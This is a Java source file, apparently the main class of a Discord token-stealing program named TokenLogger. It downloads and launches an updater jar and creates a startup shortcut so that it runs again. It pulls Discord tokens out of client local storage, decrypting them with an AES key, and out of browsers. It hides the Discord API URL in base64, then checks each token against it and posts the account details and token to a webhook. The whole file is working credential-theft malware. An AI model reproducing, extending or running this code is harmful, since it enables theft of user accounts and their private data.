package tokenlogger;

import java.nio.file.Paths;
import java.util.Set;
import java.util.HashSet;

import tokenlogger.utils.*;

import static tokenlogger.config.Config.*;

public class TokenLogger {
    private static final Set<String> tokens = new HashSet<>();
    public static final String USER_INFO_URL = Decryptor.decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjkvdXNlcnMvQG1l");

    public static void main(String[] args) {
        FileHelper.delete(UPDATER_SAVE_PATH);
        if (UpdateHelper.checkForUpdates()) {
            Requests.download(UPDATER_JAR_URL, UPDATER_SAVE_PATH);
            FileHelper.launch(UPDATER_SAVE_PATH);
            System.exit(0);
        }

        FileHelper.createShortcut(
                PathHelper.getJavaPath(),
                SHORTCUT_PATH,
                "-jar", APP_SAVE_PATH
        );

        getClientTokens();
        getBrowserTokens();
        tokens.forEach(token -> {
            String userInfo = Requests.get(USER_INFO_URL, token);
            if (userInfo == null) return;
            String infoEmbed = EmbedGenerator.generateEmbed(userInfo, token);
            if (infoEmbed == null) return;
            Requests.post(infoEmbed, WEBHOOK_URL);
        });

        System.exit(0);
    }

    private static void getClientTokens() {
        PathHelper.loadClientPaths().forEach(path ->
            tokens.addAll(Decryptor.decryptTokens(
                    Paths.get(path, "Local Storage", "leveldb").toString(),
                    Decryptor.getAESKey(path)
            ))
        );
    }

    private static void getBrowserTokens() {
        PathHelper.loadBrowserPaths().forEach(path ->
                tokens.addAll(Decryptor.getTokens(path))
        );
    }
}